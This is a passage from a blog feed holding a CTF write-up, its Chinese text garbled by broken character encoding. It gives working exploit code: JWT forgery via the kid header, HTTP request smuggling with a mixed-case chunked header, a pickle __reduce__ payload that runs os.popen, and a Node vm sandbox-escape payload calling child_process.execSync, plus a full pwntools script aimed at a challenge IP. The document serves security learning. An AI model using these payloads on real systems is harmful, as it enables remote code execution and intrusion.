&quot;isadmin&quot;: True&#125;token = jwt.encode(user_info, key, algorithm=&quot;HS256&quot;, headers=&#123;&quot;kid&quot;: &quot;app.py&quot;&#125;)print(token)</code></pre><p>æ‹¿åˆ°<code>token</code>åå°±å¯ä»¥ç”¨<code>/admin</code>çš„è½¬å‘åŠŸèƒ½äº†ï¼Œè¿™é‡Œè¦æ±‚<code>data</code>å¸¦<code>BackdoorPasswordOnlyForAdmin</code>ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token <span class="token operator">and</span> verify_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                forward_url <span class="token operator">=</span> <span class="token string">"python-backend:8080"</span>                conn <span class="token operator">=</span> http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">(</span>forward_url<span class="token punctuation">)</span>                method <span class="token operator">=</span> request<span class="token punctuation">.</span>method                headers <span class="token operator">=</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span> value <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>headers <span class="token keyword">if</span> key <span class="token operator">!=</span> <span class="token string">'Host'</span><span class="token punctuation">}</span>                data <span class="token operator">=</span> request<span class="token punctuation">.</span>data                path <span class="token operator">=</span> <span class="token string">"/"</span>                <span class="token keyword">if</span> request<span class="token punctuation">.</span>query_string<span class="token punctuation">:</span>                    path <span class="token operator">+=</span> <span class="token string">"?"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>query_string<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"chunked"</span><span class="token punctuation">:</span>                    data <span class="token operator">=</span> <span class="token string">"{}\r\n{}\r\n0\r\n\r\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span> <span class="token operator">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>                conn<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token string">"/backdoor"</span><span class="token punctuation">,</span> body<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">"Done!"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Welcome admin!"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯<code>backend</code>ä¸å…è®¸å¸¦<code>BackdoorPasswordOnlyForAdmin</code>ï¼Œä¸å¸¦çš„è¯æ‰ä¼šèµ°ååºåˆ—åŒ–ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">backdoor</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> web<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># fix this backdoor</span>        <span class="token keyword">if</span> b<span class="token string">"BackdoorPasswordOnlyForAdmin"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"You are an admin!"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data  <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Done!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè§‚å¯Ÿåˆ°<code>web.data()</code>å–æ•°æ®ï¼Œå¦‚æœé‡åˆ°<code>chunked</code>å°±ä¼šæŠŠæ•°æ®å…¨è¯»å‡ºæ¥ã€‚ä½†æ˜¯æ³¨æ„åˆ°<code>headers.get(&quot;Transfer-Encoding&quot;, &quot;&quot;).lower() == &quot;chunked&quot;:</code>è½¬äº†ä¸ªå°å†™ï¼Œä¹Ÿå°±æ˜¯è¯´å¤§å†™<code>chunKED</code>ä¹Ÿä¼šè¯†åˆ«æˆ<code>chunked</code>ç„¶ååŒ…è£…æˆåˆ†å—ä¼ è¾“çš„æ ¼å¼ç»™åç«¯å‘è¿‡å»ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714314733205.png" alt="1714314733205"></p><p><code>frontend</code>ä¼šæŠŠæ¥æ”¶åˆ°çš„<code>header</code>åŸå°ä¸åŠ¨çš„è½¬å‘ç»™<code>backend</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®<code>Transfer-Encoding: chunKed, Content-Length: &#123;len(codeb)&#125;</code>ï¼Œä¼ è¾“æ•°æ®<code>payload+BackdoorPasswordOnlyForAdmin</code>ã€‚è¯·æ±‚åˆ°è¾¾<code>frontend</code>æ—¶ä¼šè¯†åˆ«åˆ°<code>BackdoorPasswordOnlyForAdmin</code>ï¼Œåˆ°äº†<code>backend</code>å› ä¸ºæ²¡æœ‰è¯†åˆ«åˆ°<code>chunked</code>å¤´å°±ä¼šå–<code>content-length</code>çš„é•¿åº¦ä»è€Œå¿½ç•¥æ‰åé¢<code>BackdoorPasswordOnlyForAdmin</code>é‚£ä¸€éƒ¨åˆ†ã€‚</p><p>æ³¨æ„<code>requests</code>ä¼šè‡ªåŠ¨æŠŠ<code>CL</code>æ¢å¤æ‰€ä»¥ä¸èƒ½ç”¨<code>requests</code>åº“ã€‚</p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"pickle_payload"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span>kid <span class="token operator">=</span> <span class="token string">"./app.py"</span>key <span class="token operator">=</span> open<span class="token punctuation">(</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"squirt1e"</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>data <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span>host <span class="token operator">=</span> <span class="token string">"192.168.167.149:8081"</span>raw <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/admin HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closekid: app.pyTransfer-Encoding: chunKedCookie: token={token}Content-Length: {len(payload)}{hex(len(data))[2:]}{data}0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬å‘åˆ°åç«¯å°±æ˜¯ä¸ª<code>pickle</code>ååºåˆ—åŒ–ï¼Œä¸è¿‡è¿œç¨‹æ˜¯ä¸å‡ºç½‘çš„ï¼Œéœ€è¦é€šè¿‡ååºåˆ—åŒ–ç»™<code>backend</code>åŠ ä¸€ä¸ªè·¯ç”±ã€‚å› ä¸º<code>frontend</code>çš„<code>/backend</code>è·¯ç”±å¯ä»¥ä»£ç†<code>GET,POST</code>æ–¹æ³•æ–¹ä¾¿åé¢çš„<code>/index</code>ï¼Œæ‰€ä»¥ç»™<code>/index</code>åŠ ä¸ªè·¯ç”±å°±å¯ä»¥äº†ã€‚</p><pre class="line-numbers language-python"><code class="language-python">s<span class="token operator">=</span><span class="token triple-quoted-string string">"""def fuck(self):    return __import__('os').popen('ls').read()index.POST=fuck"""</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>exp <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®Œæ•´<code>exp</code>å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64s<span class="token operator">=</span><span class="token triple-quoted-string string">"""def fuck(self):    return __import__('os').popen('ls').read()index.POST=fuck"""</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>exp <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span>kid <span class="token operator">=</span> <span class="token string">"./app.py"</span>key <span class="token operator">=</span> open<span class="token punctuation">(</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"squirt1e"</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(token)</span>data <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span>host <span class="token operator">=</span> <span class="token string">"139.224.222.124:30180"</span>raw <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/admin HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closekid: app.pyTransfer-Encoding: chunKedCookie: token={token}Content-Length: {len(payload)}{hex(len(data))[2:]}{data}0"""</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">,</span> b<span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>raw2 <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/backend HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1Priority: u=1"""</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>raw2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">,</span> b<span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714316944951.png" alt="1714316944951"></p><h4 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h4><p>è¿™é¢˜å±äºçº¸è€è™ï¼Œçœ‹ä¸Šå»å¾ˆç‰›é€¼å®é™…ä¸Šå¾ˆç®€å•ã€‚é€šè¿‡<code>eval</code>æ‰§è¡Œæœ€ä¸‹é¢é‚£ä¸€ä¸²æ¨¡æ¿ä»£ç å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå…¶å®æ ˆå®ç°çš„é€»è¾‘éƒ½ä¸ç”¨çœ‹æ‡‚ã€‚ç›´æ¥å®šä½åˆ°<code>vm.run</code>ï¼Œè°ƒè¯•åˆ°è¿™é‡Œå‘ç°ä¼šæŠŠ<code>stdin</code>çš„å†…å®¹æ‹¼æ¥åˆ°<code>cmd</code>å½“ä¸­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714317870295.png" alt="1714317870295"></p><p>æ‰€ä»¥é—­åˆä¸€ä¸‹æ‹¬å·æ‰“<code>vm1</code>æ²™ç®±é€ƒé€¸å°±è¡Œäº†ã€‚</p><pre><code>&#123;&quot;stdin&quot;:[&quot;0&#39;);const p=this.constructor.constructor(&#39;return this.process&#39;)();p.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&quot;]&#125;</code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318185913.png" alt="1714318185913"></p><p>è¿˜ä¼šè´´å¿ƒçš„ç»™ä½ å›æ˜¾ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714317251652.jpg" alt="1714317251652"></p><h4 id="moonbox"><a href="#moonbox" class="headerlink" title="moonbox"></a>moonbox</h4><p>æ˜¯ä¸ªåå°<code>RCE</code>ï¼Œç™½ç›’åŠ é»‘ç›’å‡­å€Ÿç»éªŒä½“ä¼šä½“ä¼šå°±èƒ½å®šä½åˆ°æ´äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318537144.png" alt="1714318537144"></p><p>è¿™é‡Œå¯åŠ¨æµé‡å½•åˆ¶æ˜¯é€šè¿‡å¯åŠ¨ä¸€ä¸ª<code>agent hook</code>æºç¨‹åºä¹‹ç±»çš„æ“ä½œæ¥å®ç°çš„ï¼Œç›´æ¥å®šä½åˆ°<code>startAgent</code>æ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240428233714040.png" alt="image-20240428233714040"></p><p>æœ€ç»ˆæ˜¯åˆ°<code>getRemoteAgentStartCommand</code>æ–¹æ³•æ‰§è¡Œäº†ä¸€ä¸²å‘½ä»¤ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318296704.jpg" alt="1714318296704"></p><p>æ€»ä½“æ‰§è¡Œçš„å‘½ä»¤å°±è¿™äº›ï¼Œæœ¬åœ°<code>docker</code>å¾—åˆ°çš„å‘½ä»¤å¦‚ä¸‹ï¼Œ</p><pre><code>curl -o sandboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile &amp;&amp; curl -o moonboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile &amp;&amp; rm -fr ~/sandbox &amp;&amp; rm -fr ~/.sandbox-module &amp;&amp;  tar  -xzf sandboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; tar  -xzf moonboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; dos2unix ~/sandbox/bin/sandbox.sh &amp;&amp; dos2unix ~/.sandbox-module/bin/start-remote-agent.sh &amp;&amp; rm -f moonboxDownLoad.tar sandboxDownLoad.tar &amp;&amp; sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web rc_id_8683586da5b775c649752ac028f52fbc%26http%3A%2F%2F127.0.0.1%3A8080%26INFO%26INFO</code></pre><p>å¼€å§‹æƒ³çš„æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œä½†æ˜¯çœ‹äº†ä¸‹å‚æ•°ä¸å¤ªå¥½æ§åˆ¶ã€‚æ³¨æ„åˆ°æœåŠ¡ç«¯ä¼šå…ˆè¯·æ±‚<code>sandbox</code>å’Œ<code>moonbox</code>è¿™ä¸¤ä¸ªå‹ç¼©åŒ…å¹¶ä¸”è§£å‹ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ<code>~/.sandbox-module/bin/start-remote-agent.sh</code>ã€‚</p><pre><code>sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web</code></pre><p>æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ å¯¹åº”æ ¼å¼çš„å‹ç¼©åŒ…å°±è¡Œäº†ç›´æ¥åå¼¹<code>shell</code>å°±è¡Œäº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318821687.png" alt="1714318821687"></p><p>ç”¨æ¥<code>RCE</code>çš„<code>moonbox</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318888734.png" alt="1714318888734"></p><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯å®ƒæ˜¯é€šè¿‡<code>&amp;&amp;</code>æ‰§è¡Œå‘½ä»¤ï¼Œå‰é¢æŠ¥é”™å°±ä¸ä¼šæ‰§è¡Œåˆ°<code>start-remote-agent.sh</code>ã€‚å”¯ä¸€çš„å‘ç‚¹å°±æ˜¯å‰é¢æœ‰ä¸ª<code>dos2unix ~/sandbox/bin/sandbox.sh</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åˆ¶ä½œä¸€ä¸ªåŒ…ï¼Œé‡Œé¢åŒ…å«<code>sandbox/bin/sandbox.sh</code>ï¼Œä¹‹åä¼ åˆ°<code>sandbox</code>å°±è¡Œäº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319060915.jpg" alt="1714319060915"></p><h4 id="Doctor"><a href="#Doctor" class="headerlink" title="Doctor"></a>Doctor</h4><p>è‚¯å®šè¦è¿›åå°ï¼Œæ¥å£æœ‰ä¸¤æ¬¡é‰´æƒã€‚ç¬¬ä¸€æ¬¡æ˜¯è®¿é—®ä»»æ„æ¥å£éƒ½ä¼šæ ¡éªŒä¸€ä¸‹<code>jwt</code>å¤´ï¼Œç¬¬äºŒæ¬¡æ˜¯è®¿é—®<code>admin</code>ç­‰é«˜æƒé™è·¯ç”±ä¼šå†æ¬¡è§£æè¯†åˆ«å½“å‰ç”¨æˆ·æ˜¯å¦ä¸º<code>admin</code>ã€‚</p><p>ç¬¬ä¸€æ¬¡é‰´æƒæ‰¾åˆ°æ–¹æ³•ç»•è¿‡äº†ï¼Œç¬¬äºŒæ¬¡çš„è§£æçœ‹èµ·æ¥ä¸å¯èƒ½ç»•è¿‡ã€‚é‚£ä¹ˆå°±æ˜¯<code>sql</code>æ³¨å…¥äº†ï¼Œä½†æ˜¯å¯åˆ©ç”¨çš„<code>sql</code>æ³¨å…¥æ²¡æ‰¾åˆ°ã€‚ã€‚ã€‚</p><p>ä¸è¿‡æˆ‘æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœæ˜¯<code>sql</code>æ³¨å…¥åæŸ¥è§£<code>hash</code>çš„è¯é‚£ä¹ˆçˆ†ç ´å¯†ç æ˜¯ä¸æ˜¯ä¹Ÿèƒ½è¿›åå°ã€‚ã€‚ã€‚ä¸ºä»€ä¹ˆçˆ†ç ´äº†è¿›ä¸å»å‘¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆueditorçš„jsonæ³¨å…¥é—®é¢˜</title>
      <link href="/2024/03/28/qian-tan-ueditor-de-json-zhu-ru-wen-ti/"/>
      <url>/2024/03/28/qian-tan-ueditor-de-json-zhu-ru-wen-ti/</url>
      
